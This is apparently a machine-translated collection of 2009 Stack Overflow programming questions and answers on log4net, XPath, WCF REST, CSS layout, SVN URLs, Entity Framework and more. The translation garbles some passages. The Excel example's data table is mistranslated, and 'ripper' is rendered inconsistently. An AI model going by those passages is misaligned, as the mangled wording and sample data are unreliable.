 ***在这一点上，我将关闭 CaseInsentive 并只是转换案例。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-16T17:47:06.873

恕我直言，最好是在发布时确保数据质量。推理：

1.  您（通常）知道数据的性质。所以，例如。您可以使用 UpperCase（知道 GUID 都在 ASCII 范围内），而不是像 TdxMemDataSet 这样的通用组件被迫使用的慢得多的 AnsiUpperCase *。*

2.  您只需输入一次数据。Searching/Sorting/Filtering 这一切都暗示了 TdxMemDataSet 的内部转换引擎，这是一个重复的动作。此外，还有其他连锁动作会在没有意识到的情况下触发这个引擎。（例如，默认情况下排序的 TcxGrid 具有 GridMode:=True （我假设您使用 DevEx. 组件）并且有一个充当代理的类，将排序消息传递给底层数据集。

3.  通常数据输入是分步完成的，一批记录一个或几个记录。唯一值得注意的例外是数据采集应用程序。但是在以上两种情况下，用户的可用性文化都允许您使用更长**的**响应时间。（IOW 多少会在持续 0.005 毫秒的记录帖子中添加大写调用？） OTOH，用户对数据检索操作（搜索、排序、过滤等）的速度**要求很高。**尽可能快地保持数据检索。

4.  准备好暴露数据库中的数据可以降低在您编写（*如果*您要编写）其他模块时处理错误的风险（您需要记住 AnsiUpperCase 以您将编写的任何语言的任何模块中的数据）。这里还有一个经典示例，当您将使用其他外部工具访问数据时（例如，数据库管理器对数据执行 SQL SELCT）。

hth。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:49:39.640

也许 DevExpress 论坛（或任何支持电子邮件，如果您可以访问它）将是寻求有关该性能问题的权威答案的更好地方。

无论如何，最好在保存数据的那一刻保证数据采用您想要的格式 - 原因已经解释清楚了。因此，在特定情况下，请确保 GUID 以大写（或小写，这是个人喜好）大小写。如果它是具有 guid 数据类型的 SQL Server 或其他数据库服务器，请确保 SELECT 可以正常工作 - 如果**适用且可能**，甚至排序。

# java - 使用 XPath 查询 XML 时始终为 null

> ID：651265
> 
> 赞同：4
> 
> 时间：2009-03-16T17:00:08.543
> 
> 标签：java, xml, xpath

我正在使用以下代码使用从流中获取的 XPath 查询一些 XML。

```
DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance();
domFactory.setNamespaceAware(false);
DocumentBuilder builder = domFactory.newDocumentBuilder();
Document doc = builder.parse(inputStream);
inputStream.close();

XPathFactory factory = XPathFactory.newInstance();
XPath xpath = factory.newXPath();
XPathExpression expr = xpath.compile("//FOO_ELEMENT");

Object result = expr.evaluate(doc, XPathConstants.NODESET);
NodeList nodes = (NodeList) result;
for (int i = 0; i < nodes.getLength(); i++) {
    System.out.println(nodes.item(i).getNodeValue()); 
```

我已经通过将流转换为字符串来检查流的内容——它就在那里——所以它不像流中没有数据。

现在这让我很烦 - 因为我尝试了各种不同的代码，但我仍然在“System.out.println”行打印'null' - 我在这里错过了什么？

注意：我想查看元素内的文本。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-16T17:25:19.763

除了 Brabster 的建议之外，您可能还想尝试

```
System.out.println(nodes.item(i).getTextContent()); 
```

或者

```
System.out.println(nodes.item(i).getNodeName()); 
```

取决于您要显示的内容。

见[http://java.sun.com/javase/6/docs/api/org/w3c/dom/Node.html](http://java.sun.com/javase/6/docs/api/org/w3c/dom/Node.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-16T17:13:08.060

不是 Java XPath impl tbh 方面的专家，但这可能会有所帮助。

javadocs 说，对于大多数类型的节点，getNodeValue() 的结果将为空。

您希望在输出中看到什么并不完全清楚。元素名称、属性、文本？我会猜文字。在我使用过的任何 XPath impl 中，如果你想要节点的文本内容，你必须使用 XPath 来

```
//FOO_ELEMENT/text() 
```

那么节点的值就是节点的文本内容。

getTextContent() 方法将返回您使用 XPath 选择的节点的文本内容，以及根据 javadoc 的任何后代节点。上面的解决方案恰好选择了文档中任何节点 FOO_ELEMENT 的文本组件。

[Java EE Docs for Node](http://java.sun.com/j2ee/sdk_1.3/techdocs/api/org/w3c/dom/Node.html#getNodeValue()) <-- 旧文档，请参阅当前文档的注释。

# c# - Is there a WCF Rest C# Client Generation Tool?

> ID：651273
> 
> 赞同：23
> 
> 时间：2009-03-16T17:01:55.233
> 
> 标签：c#, wcf, rest

Before I venture down the path of creating one, I was wondering if anyone knows of a utility program which will take the REST Help page of a WCF Rest Service and create the relevant Client for C# consumption.

Similar to what svcutil.exe does for WCF Services or what wsdl.exe did for web services but for WCF REST Services

Kind Regards,

Andrew

**EDIT Some more detail:**

Please see this link: [http://msdn.microsoft.com/en-us/library/dd203052.aspx](http://msdn.microsoft.com/en-us/library/dd203052.aspx)

**In the restful service using the WCF Rest Starter Kit Preview 2, they supply types which will be serialized. But My intention is be able to create clients form the help page which describes schemas. Clients could then be created for C#, JavaScript, ActionScript etc.. shearly as a strongly typed version of the restful service, not a requirement or necessity. It is a program or uitlity I am wondering exists which does this**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2010-07-29T21:00:53.893

我想您可能正在寻找[WebChannelFactory](http://msdn.microsoft.com/en-us/library/bb908674.aspx)。它可以生成基于 WCF 属性的 REST 接口的通道类。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T17:14:46.513

好吧，即使您想抽象，也没有任何用处。所有 Rest 服务都可以使用 HTTP 动词，例如 GET、POST、PUT、DELETE

因此，基本上您的客户端可以拥有的只是一个可以接受端点、网络凭据、需要传递的名称值集合和要使用的动词的静态类。

这将更像是一个实用程序类而不是客户端。

我不记得看到过 WSDL 或某些合同，我们可以根据这些合同为 REST 服务编写客户端。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T17:29:34.027

我希望您不要花费太多时间将代码基于预发布代码的当前帮助页面。您是否确定此帮助页面提供了产生客户所需的所有信息？

另外，您是否看过 WCF REST Starter 工具包的 Prerelease 2？如果没有，你去看看。那里有新的客户端技术。

* * *

## 回答 #4

> 赞同：-4
> 
> 时间：2009-03-16T17:05:50.543

Why would you create clients for a RESTful service? You don't need one - you just need to be able to initial HTTP requests. If you would like to call the same operations via SOAP or some other method then create a new endpoint for the service and a new contract and expose `mex` for it so that svcutil can consume it.

# c# - 如何消除 log4net 中的重复登录？

> ID：651277
> 
> 赞同：63
> 
> 时间：2009-03-16T17:02:22.487
> 
> 标签：c#, logging, log4net

我有一个程序可以对“myprogram”记录器进行许多 log4net 调用。它还调用其他代码，使 log4net 调用其他记录器。我想为“myprogram”捕获所有高于 INFO 的日志，为其他所有内容捕获所有高于 WARN 的日志。这样，我会收到特定于我正在处理的任务的正在进行的消息，但仍会收到支持代码中发生的潜在不良事件的通知。我希望将其发送到控制台和日志文件。

我有以下 log4net 配置：

```
<log4net>
    <root>
        <level value="WARN" />
        <appender-ref ref="Console" />
        <appender-ref ref="LogFile" />
    </root>
    <logger name="myprogram">
        <level value="INFO" />
        <appender-ref ref="Console" />
        <appender-ref ref="LogFile" />
    </logger>
    <appender name="Console" type="log4net.Appender.ConsoleAppender">
        <layout type="log4net.Layout.PatternLayout">
            <conversionPattern value="%message%newline" />
        </layout>
        <threshold value="INFO" />
    </appender>
    <appender name="LogFile" type="log4net.Appender.RollingFileAppender">
        <layout type="log4net.Layout.PatternLayout">
            <conversionPattern value="- %utcdate %level %logger %ndc %thread %message%newline" />
        </layout>
        <appendToFile value="false" />
        <staticLogFileName value="true" />
        <rollingStyle value="Once" />
        <file value="mylogfile" />
        <immediateFlush value="true" />
        <threshold value="INFO" />
        <lockingModel type="log4net.Appender.FileAppender+MinimalLock" />
    </appender>
</log4net> 
```

这对我来说非常有意义：为所有内容记录>WARN，为特定的“myprogram”记录器记录>INFO。

问题是我在控制台和日志文件上都记录**了两次INFO 消息。**仅当我同时填充了`<root>`和元素时，才会发生这种情况；`<logger>`如果我删除任何一个，那么剩下的一个会按我的预期工作。

我可以理解我是否获得了 WARN 条目的双重记录（因为 myprogram 同时匹配“root”和“myprogram”），但是即使 ROOT（可能）设置为 WARN，它也会发生在 INFO。

我在这里做错了什么，或者这是一个 log4net 错误/歧义？

* * *

## 回答 #1

> 赞同：80
> 
> 时间：2009-03-19T11:47:05.817

你被重复了，因为你告诉它记录两次消息。我不建议在这里使用可加性，因为您可能会遇到一些副作用，只需删除不必要的配置：

```
<root>
    <level value="WARN" />
    <appender-ref ref="Console" />
    <appender-ref ref="LogFile" />
</root>
<logger name="myprogram">
    <level value="INFO" />
</logger> 
```

您不需要在记录器 myprogram 中指明 appender-ref，因为它将从根记录器继承它们；如果您再次指定它们，它将记录两次。

* * *

## 回答 #2

> 赞同：71
> 
> 时间：2009-03-16T17:08:43.827

尝试进行此更改，将可加性设置为 false。

```
<root>
    <level value="WARN" />
    <appender-ref ref="Console" />
    <appender-ref ref="LogFile" />
</root>
<logger name="myprogram" additivity="false">
    <level value="INFO" />
    <appender-ref ref="Console" />
    <appender-ref ref="LogFile" />
</logger> 
```

# c# - 反射与应用设计

> ID：651283
> 
> 赞同：1
> 
> 时间：2009-03-16T17:05:00.577
> 
> 标签：c#, reflection, appdomain

让我描述一下我目前拥有的问题和解决方案，也许您可​​以帮助我了解为什么这是一个坏主意（假设是）以及我可以做些什么来使它成为一个更好的系统。

现在我有 600 个“开膛手”来解析文件并将它们撕成 csv 或其他格式。裂土器都实现了一个通用接口和基类。当作业根据该作业的配置排队时，使用反射调用特定的 ripper。

```
 foreach (var stream in streams)
            {
                try
                {
                    // load it
                    Assembly asm = Assembly.LoadFile(Path.Combine(stream.RipperPath, stream.RipperFileName), new Evidence());
                    if (asm == null)
                    {
                        MessageBox.Show(String.Format("Invalid Interface ripper loaded.\n{0}", Path.Combine(stream.RipperPath, stream.RipperFileName)));
                        return;
                    }

                    foreach (Type objType in asm.GetTypes())
                    {
                        if (!objType.IsPublic)
                            continue;

                        // make sure the type isn't Abstract
                        if (((objType.Attributes & TypeAttributes.Abstract) == TypeAttributes.Abstract))
                            continue;

                        // IRipper is the interface that all of the Rippers must implement to be loaded
                        Type objInterface = objType.GetInterface("IRipper", true);
                        if (objInterface == null)
                            continue;

                        try
                        {
                            var iri = (IRipper)Activator.CreateInstance(objType);

                            // Rippers must register with their hosts
                            iri.Host = this;
                            iri.OnStart += RipperStart;
                            iri.OnComplete += RipperComplete;
                            iri.OnProgressChanged += RipperStatusUpdate;
                            iri.dataStream = stream;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(String.Format("Error loading interface: {0}\n{1}", Path.Combine(stream.RipperPath, stream.RipperFileName), ex.Message));
                }
            } 
```

所有开膛手都实现了一个名为“Rip()”的函数，接口将它们收缩到该函数。

使用当前代码，我能看到的唯一问题是在加载 600 个程序集后（因为它们是在需要时加载的），如果它们在使用后没有被卸载，它会开始变得有点慢。

你有什么建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T17:19:29.683

您实际上有 600 个不同的裂土器，还是 600 个流和一些较少数量的裂土器？您真的需要每个开膛手都在自己的组装中吗？如果您可以将裂土器捆绑在一起，那么您可以拥有更少的组件。如果您的流详细信息包含类型名称以及可执行文件，则您可能有多个 ripper，并且您无需查看它们的程序集 - 只需调用`Assembly.GetType`.

请注意，我不知道每个程序集实际上有多少开销 - 我希望 600 个程序集会占用相当多的内存，但不会对性能产生太大影响。

总体方法似乎是合理的，尽管您可能还想查看[托管可扩展性框架 (MEF)](http://www.codeplex.com/MEF) - 对于您的情况来说，这可能有点矫枉过正，但值得一看。我要做的另一件事是从“处理流”代码中排除“获取开膛手”:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T17:26:50.477

您可能想看看[System.Addin](http://msmvps.com/blogs/kathleen/archive/2008/01/03/why-you-care-about-system-addin.aspx)的东西。加载项似乎加载到它们自己的应用程序域中，这使得在不再需要它们时可以干净地卸载它们。

# .net - 保护 .NET 应用程序

> ID：651291
> 
> 赞同：0
> 
> 时间：2009-03-16T17:07:23.660
> 
> 标签：.net, security, obfuscation, reverse-engineering

### 复制：

> [保护 .NET 代码免受逆向工程](https://stackoverflow.com/questions/506282/protect-net-code-from-reverse-engineering/)

我们最近发布了一个小应用程序，这个周末我发现了一个破解版，它`Piratebay`删除了注册检查，所以应用程序运行起来就像是注册版一样。

除了使用代码混淆工具（似乎并不难解决）之外，我们还应该做些什么标准的事情来让我们的 .NET 应用程序更难破解？

# asp.net - ObjectDataSource created twice when control is changed

> ID：651293
> 
> 赞同：3
> 
> 时间：2009-03-16T17:07:40.477
> 
> 标签：asp.net, data-binding, gridview

I'm using an ObjectDataSource with a GridView with an OnObjectCreated handler on the code-behind. If I programmatically change a child control value on the GridView, the entire control gets databound a second time in the same request (as shown by the OnObjectCreated handler), which I don't want. This happens on the initial page GET request (so it is not a postback issue). Here's what a trace shows:

```
aspx.page   Begin PreRender
Custom      IN  handleDSObjectCreated() => tsDao: ETime.DAL.TimeSheetDAO    
Custom      OUT handleDSObjectCreated() 
Custom      IN  handleDSObjectCreated() => tsDao: ETime.DAL.TimeSheetDAO    
Custom      OUT handleDSObjectCreated() 
aspx.page   End PreRender 
```

Is there a way to prevent the second round of databinding even if I manipulate the child controls? Nothing in the data layer changes so it is not needed. Note also there are no image urls involved which seem to cause double databinding too. Thanks.

Update:

I'm not sure if this helps or not, but in looking at the stack trace at the point at which the OnObjectCreated handler is called shows the following differences:

First Event Handler Invocation:

```
System.Web.dll!System.Web.UI.WebControls.GridView.DataBind() + 0x5 bytes
System.Web.dll!System.Web.UI.WebControls.BaseDataBoundControl.EnsureDataBound() + 0x53 bytes
System.Web.dll!System.Web.UI.WebControls.GridView.OnPreRender(System.EventArgs e = {System.EventArgs}) + 0x19 bytes
System.Web.dll!System.Web.UI.Control.PreRenderRecursiveInternal() + 0x57 bytes 
```

Second Event Handler Invocation:

```
System.Web.dll!System.Web.UI.WebControls.GridView.DataBind() + 0x5 bytes
System.Web.dll!System.Web.UI.WebControls.BaseDataBoundControl.EnsureDataBound() + 0x53 bytes    
System.Web.dll!System.Web.UI.WebControls.CompositeDataBoundControl.CreateChildControls() + 0x46 bytes
System.Web.dll!System.Web.UI.Control.EnsureChildControls() + 0x58 bytes
System.Web.dll!System.Web.UI.Control.PreRenderRecursiveInternal() + 0x33 bytes 
```

Again, this is all from the initial GET request. Any ideas why it's getting invoked twice?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T17:15:48.927

也许你应该使用

```
if(!IsPostBack){
 //your code.
} 
```

是你要找的吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T17:39:30.633

数据绑定在您的场景中发生两次是否会导致其他问题？仅供参考，您可以通过处理 ObjectCreating 事件自己管理数据源对象的创建。如果将处理程序中的 ObjectDataSourceEventArgs.ObjectInstance 属性设置为有效（非空）实例，则数据源将绑定到该实例而不是创建新实例。

# svn - 如何通过 Web 视图浏览 Subversion 存储库的旧版本？

> ID：651305
> 
> 赞同：148
> 
> 时间：2009-03-16T17:10:15.197
> 
> 标签：svn

我知道如何通过它的 web 前端浏览我项目的 Subversion 存储库，但我似乎只能浏览主干的最新版本。有没有办法通过 Web UI 浏览旧版本的主干？

我知道如何从命令行执行此操作，但我需要知道如何使用 URL 执行此操作，因为我将这些 URL 嵌入到文档中。我也知道我可以创建一个 svn 风格的树干标签，但我不想这样做。

* * *

## 回答 #1

> 赞同：188
> 
> 时间：2009-03-16T17:14:57.620

将类似这样的内容附加到您的存储库 URL：

```
!svn/bc/<revision_number>/ 
```

例如

```
http://www.example.com/svnrepository/!svn/bc/3/ 
```

* * *

### 选择

来自[Bert Huijben 的评论](https://stackoverflow.com/users/2094/bert-huijben)：

> 如果您的存储库使用 Subversion 1.6.0 或更高版本托管，您可以使用 example.com/svnrepository/?p=3 来获得相同的结果...此方法 /is/ 已记录。（?r= 文件的修订，?p= URL 的操作修订）。请参阅 subversion 1.6 发行说明

* * *

## 回答 #2

> 赞同：77
> 
> 时间：2013-11-18T12:38:35.843

将此附加到您的存储库的 URL：

```
?p=24 
```

例子：

```
http://www.example.com/svnrepository/?p=65
http://www.example.com/svnrepository/subdir/file.html?p=42 
```

文档：[http ://subversion.apache.org/docs/release-notes/1.6.html#historical-uris](http://subversion.apache.org/docs/release-notes/1.6.html#historical-uris)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T17:15:00.740

这取决于您使用的 svn webclient。在 trac （可能还有其他一些）的情况下，只需将参数 rev= 添加到查询字符串中。

即[http://trac.example.com/log/trunk/client/filename?rev=123](http://trac.example.com/log/trunk/client/filename?rev=123)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-11T14:00:46.907

如果您使用 VisualSVN Server 3.2 或更新版本，那么您可以使用其基于 HTML5 的基于 Web 的历史浏览器来完成此任务。例如，[这是一个存储库树，它存在于`serf`网络库存储库](http://demo-server.visualsvn.com/!/#serf/view/r1001/trunk)的修订版 1001 中。

请参阅[Web 界面的说明](https://www.visualsvn.com/server/features/svn-web-interface/)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-06-02T18:13:10.060

从网络上，您可以转到存储库 SVN 页面并在其后添加 /：

```
https://<host>/subversion/source/<revision> 
```

例如：

```
https://app.assembla.com/spaces/myproject/subversion/source/1200 
```

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2009-03-16T17:14:38.137

内置的 Web 界面不允许检索旧版本（或您已经看到的任何其他信息）。您可以安装第三方基于 Web 的存储库浏览软件来绕过此限制。我自己没有使用过，所以我不会提供建议，但我相信其他人会（快速的谷歌搜索也会帮助你找到一些）。

# c# - Entity Framework Mapping Oddity - 成员名称不能与其封闭类型相同

> ID：651312
> 
> 赞同：4
> 
> 时间：2009-03-16T17:13:05.800
> 
> 标签：c#, asp.net, entity-framework

我从数据库创建了一个实体模型，并收到错误“成员名称不能与其封闭类型相同”。这意味着有一个与类同名的属性。

所以错误就在这里

```
 /// <summary>
    /// There are no comments for Employee in the schema.
    /// </summary>
    [global::System.ComponentModel.BrowsableAttribute(false)]
    [global::System.Runtime.Serialization.DataMemberAttribute()]
    public global::System.Data.Objects.DataClasses.EntityReference<Employee> EmployeeReference
    {
        get
        {
            return ((global::System.Data.Objects.DataClasses.IEntityWithRelationships)(this)).RelationshipManager.GetRelatedReference<Employee>("HumanResourceModel.FK_EmployeeReferenceMapping_Employee", "Employee");
        }
        set
        {
            if ((value != null))
            {
                ((global::System.Data.Objects.DataClasses.IEntityWithRelationships)(this)).RelationshipManager.InitializeRelatedReference<Employee>("HumanResourceModel.FK_EmployeeReferenceMapping_Employee", "Employee", value);
            }
        }
    } 
```

这是一部分

```
 [global::System.Data.Objects.DataClasses.EdmEntityTypeAttribute(NamespaceName="HumanResourceModel", Name="EmployeeReference")]
[global::System.Runtime.Serialization.DataContractAttribute(IsReference=true)]
[global::System.Serializable()]
public partial class EmployeeReference : global::System.Data.Objects.DataClasses.EntityObject
{ 
```

我可以通过重命名属性的名称来“修复”这个错误（但这会在将来导致大量问题），但是如何从创建的代码中修复这个错误？我将外键重命名为映射，但这不起作用。

有任何想法吗？

干杯萨基。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-23T15:18:35.580

弄清楚了

[实体框架：加载多对一实体](https://stackoverflow.com/questions/526530/entity-framework-loading-many-to-one-entity)

因为它将引用附加到多对一

Employee.Load() EmployeeReference.Load()

并且因为我有一张 EmployeeReference 表，所以它死在了它的屁股上！

Fix=重命名employeeReferenceTable

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T22:38:24.970

所以有问题的课程是......

```
public class Employee
{
    public object Employee { get; set; }
} 
```

我意识到这是一个实体框架模型，您没有在代码中指定它，但这本质上是您创建的，对吧？

如果是这样，由于 EF 的工作方式，我认为除了重命名属性或对象之外别无他法。它可能不是世界上最友好的系统，但对于 EF 的编码方式，规则是必要的。

我相信您在更改一个或另一个名称时遇到的任何重命名问题都可以克服。如果不是，请考虑另一种数据访问方法。

# excel - Autofiltered List; cross-row formula

> ID：651314
> 
> 赞同：0
> 
> 时间：2009-03-16T17:13:11.167
> 
> 标签：excel

I have a large Autofiltered list (~600 rows), with some of the rows being summary rows that I want to use a UDF to display the lowest priority listed in any of the 'child' cells. I can pass to my formula the right cells, but they are no longer correct if the list is re-ordered in any way. Is there a way to give the formula the right cell and have it recognise that I want that row and only ever that row?

I can do it with a VLOOKUP to look at a hidden column that lists wether the 'child' row matches the right criteria, but with 600 rows and each parent row requiring about a dozen 'child' cells each, it's too slow.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-04T01:42:44.647

假设您的数据如下所示：

```
年龄性别优先
52 男 521
53 楼 631
78 米 12
81 楼 632

```

然后，如果您想获得男性的最低优先级，您可以执行以下操作：

={MIN(IF(B2:B5="M", C2:C5, 9999999999999999))}

注意：{} 括号只是表示您需要将公式作为数组公式输入。

不是 100% 肯定会回答你的问题，但希望它有助于指出一个可行的方向。

# html - Div 宽度 100% 减去固定数量的像素

> ID：651317
> 
> 赞同：338
> 
> 时间：2009-03-16T17:14:24.720
> 
> 标签：html, css, height, width

如何在不使用表或 JavaScript 的情况下实现以下结构？白色边框代表 div 的边缘，与问题无关。

![结构1](https://i.stack.imgur.com/zH7rf.png)

中间区域的大小会有所不同，但它将具有精确的像素值，并且整个结构应根据这些值进行缩放。为了简化它，我需要一种将“100% - n px”宽度设置为中上和中下 div 的方法。

我很欣赏一个干净的跨浏览器解决方案，但如果不可能，CSS hacks 会做。

这是一个奖金。我一直在努力解决的另一种结构，最终使用了表格或 JavaScript。它略有不同，但引入了新问题。我一直主要在基于 jQuery 的窗口系统中使用它，但我想将布局保留在脚本之外，并且只控制一个元素（中间元素）的大小。

![结构2](https://i.stack.imgur.com/oe3GE.png)

* * *

## 回答 #1

> 赞同：828
> 
> 时间：2013-02-04T11:23:36.970

我刚刚偶然发现的新方法：[css`calc()`](http://caniuse.com/#feat=calc)：

```
.calculated-width {
    width: -webkit-calc(100% - 100px);
    width:    -moz-calc(100% - 100px);
    width:         calc(100% - 100px);
}​ 
```

来源：**[css 宽度 100% 减去 100px](https://www.w3schools.com/cssref/func_calc.asp)**

* * *

## 回答 #2

> 赞同：80
> 
> 时间：2009-03-16T17:45:25.877

您可以使用嵌套元素和填充来获得工具栏上的左右边缘。`div`元素的默认宽度是`auto`，这意味着它使用可用的宽度。然后，您可以向元素添加填充，它仍然保持在可用宽度内。

这是一个示例，您可以使用该示例将图像放置为左右圆角，以及在它们之间重复的中心图像。

的HTML：

```
<div class="Header">
   <div>
      <div>This is the dynamic center area</div>
   </div>
</div> 
```

CSS：

```
.Header {
   background: url(left.gif) no-repeat;
   padding-left: 30px;
}
.Header div {
   background: url(right.gif) top right no-repeat;
   padding-right: 30px;
}
.Header div div {
   background: url(center.gif) repeat-x;
   padding: 0;
   height: 30px;
} 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-08-26T10:08:01.433

虽然 Guffa 的答案在许多情况下都有效，但在某些情况下，您可能不希望左侧和/或右侧的填充部分成为中心 div 的父级。在这些情况下，您可以在中心使用块格式化上下文并左右浮动填充 div。这是代码

的HTML：

```
<div class="container">
    <div class="left"></div>
    <div class="right"></div>
    <div class="center"></div>
</div> 
```

CSS：

```
.container {
    width: 100px;
    height: 20px;
}

.left, .right {
    width: 20px;
    height: 100%;
    float: left;
    background: black;   
}

.right {
    float: right;
}

.center {
    overflow: auto;
    height: 100%;
    background: blue;
} 
```

我觉得与嵌套嵌套的 div 相比，这种元素层次结构更自然，并且更好地代表了页面上的内容。正因为如此，边框、填充和边距可以正常应用于所有元素（即：这种“自然性”超越了样式并产生了影响）。

请注意，这仅适用于共享其“默认填充 100% 宽度”属性的 div 和其他元素。输入、表格和可能的其他内容将需要您将它们包装在容器 div 中并添加更多 css 以恢复这种质量。如果您不幸遇到这种情况，请与我联系，我会挖掘 css。

jsfiddle在这里：[jsfiddle.net/RgdeQ](http://jsfiddle.net/RgdeQ)

享受！

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2015-12-10T13:29:02.407

您可以使用[**Flexbox**](https://css-tricks.com/snippets/css/a-guide-to-flexbox/)布局。您需要分别设置[`flex: 1`](https://developer.mozilla.org/en/docs/Web/CSS/flex)需要具有动态宽度或高度的元素[`flex-direction: row and column`](https://developer.mozilla.org/en-US/docs/Web/CSS/flex-direction)。

**动态宽度：**

**HTML**

```
<div class="container">
  <div class="fixed-width">
    1
  </div>
  <div class="flexible-width">
    2
  </div>
  <div class="fixed-width">
    3
  </div>
</div> 
```

**CSS**

```
.container {
  display: flex;
}
.fixed-width {
  width: 200px; /* Fixed width or flex-basis: 200px */
}
.flexible-width {
  flex: 1; /* Stretch to occupy remaining width i.e. flex-grow: 1 and flex-shrink: 1*/
} 
```

**输出：**

```
.container {
  display: flex;
  width: 100%;
  color: #fff;
  font-family: Roboto;
}
.fixed-width {
  background: #9BCB3C;
  width: 200px; /* Fixed width */
  text-align: center;
}
.flexible-width {
  background: #88BEF5;
  flex: 1; /* Stretch to occupy remaining width */
  text-align: center;
}
```

```
<div class="container">
  <div class="fixed-width">
    1
  </div>
  <div class="flexible-width">
    2
  </div>
  <div class="fixed-width">
    3
  </div>

</div>
```

* * *

**动态高度：**

**HTML**

```
<div class="container">
  <div class="fixed-height">
    1
  </div>
  <div class="flexible-height">
    2
  </div>
  <div class="fixed-height">
    3
  </div>
</div> 
```

**CSS**

```
.container {
  display: flex;
}
.fixed-height {
  height: 200px; /* Fixed height or flex-basis: 200px */
}
.flexible-height {
  flex: 1; /* Stretch to occupy remaining height i.e. flex-grow: 1 and flex-shrink: 1*/
} 
```

**输出：**

```
.container {
  display: flex;
  flex-direction: column;
  height: 100vh;
  color: #fff;
  font-family: Roboto;
}
.fixed-height {
  background: #9BCB3C;
  height: 50px; /* Fixed height or flex-basis: 100px */
  text-align: center;
  display: flex;
  flex-direction: column;
  justify-content: center;
}
.flexible-height {
  background: #88BEF5;
  flex: 1; /* Stretch to occupy remaining width */
  text-align: center;
  display: flex;
  flex-direction: column;
  justify-content: center;
}
```

```
<div class="container">
  <div class="fixed-height">
    1
  </div>
  <div class="flexible-height">
    2
  </div>
  <div class="fixed-height">
    3
  </div>

</div>
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-03-17T05:59:30.323

通常的做法是如 Guffa 所述，嵌套元素。不得不添加额外的标记来获得你需要的钩子有点难过，但实际上这里或那里的包装器 div 不会伤害任何人。

如果您必须在没有额外元素的情况下执行此操作（例如，当您无法控制页面标记时），您可以使用[box-sizing](https://stackoverflow.com/questions/628500/can-i-stop-100-width-text-boxes-from-extending-beyond-their-containers/628912#628912)，它具有相当不错但不完整或简单的浏览器支持。可能比不得不依赖脚本更有趣。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2015-07-19T13:41:05.123

也许我很愚蠢，但表不是这里明显的解决方案吗？

```
<div class="parent">
    <div class="fixed">
    <div class="stretchToFit">
</div>

.parent{ display: table; width 100%; }
.fixed { display: table-cell; width: 150px; }
.stretchToFit{ display: table-cell; vertical-align: top} 
```

我在 chrome 中发现的另一种方法甚至更简单，但伙计，这是一个 hack！

```
.fixed{ 
   float: left
}
.stretchToFit{
   display: table-cell;
   width: 1%;
} 
```

仅此一项就应该水平填充该行的其余部分，就像表格单元格一样。但是，当它超过其父级的 100% 时，您会遇到一些奇怪的问题，但将宽度设置为百分比值可以解决它。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2017-09-19T04:29:02.723

我们可以很容易地使用 flex-box 来实现这一点。

如果我们有 Header、MiddleContainer 和 Footer 三个元素。我们想给页眉和页脚一些固定的高度。那么我们可以这样写：

对于 React/RN（默认是 'display' 作为 flex 和 'flexDirection' 作为列），在 web css 中我们必须指定 body 容器或包含这些的容器作为 display: 'flex', flex-direction: 'column'如下所示：

```
 container-containing-these-elements: {
     display: flex,
     flex-direction: column
    }
    header: {
     height: 40,
    },
    middle-container: {
     flex: 1, // this will take the rest of the space available.
    },
    footer: {
     height: 100,
    } 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-03-16T17:16:37.693

如果您的包装 div 是 100% 并且您使用填充像素量，那么如果填充 # 需要是动态的，您可以在事件触发时轻松使用 jQuery 修改填充量。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2011-02-08T04:25:19.770

我有一个类似的问题，我希望在屏幕顶部有一个横幅，左侧有一个图像，右侧有一个重复图像到屏幕边缘。我最终像这样解决了它：

CSS：

```
.banner_left {
position: absolute;
top: 0px;
left: 0px;
width: 131px;
height: 150px;
background-image: url("left_image.jpg");
background-repeat: no-repeat;
}

.banner_right {
position: absolute;
top: 0px;
left: 131px;
right: 0px;
height: 150px;
background-image: url("right_repeating_image.jpg");
background-repeat: repeat-x;
background-position: top left;
} 
```

关键是正确的标签。我基本上是在指定我希望它从左边的 131px 到右边的 0px 重复。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-03-16T17:19:15.987

在某些情况下，您可以利用边距设置来有效地指定“100% 宽度减去 N 像素”。[请参阅此问题](https://stackoverflow.com/questions/468038/in-css-how-do-i-get-a-left-side-fixed-width-column-with-a-right-side-table-that)的已接受答案。

# javascript - 从动态生成的文本框中获取 innerHTML 值（在 javascript 中）

> ID：651318
> 
> 赞同：3
> 
> 时间：2009-03-16T17:14:33.767
> 
> 标签：javascript, textbox

我正在使用 JavaScript 动态生成一个对话框（它是一个 div 元素），其中包含一个文本框和一个提交按钮。我计划使用 AJAX 将文本框中的值提交到另一个页面。

我的问题是我可以很好地生成我的文本框，但我无法从中获得价值。innerHTML 每次都返回空白。我不确定我做错了什么。

```
// Generate dialogue box using div 
function create_div_dynamic()
{ 
  //Create the div element
  dv = document.createElement('div');

  //unique tags
  var unique_div_id = 'mydiv' + Math.random() * .3245;
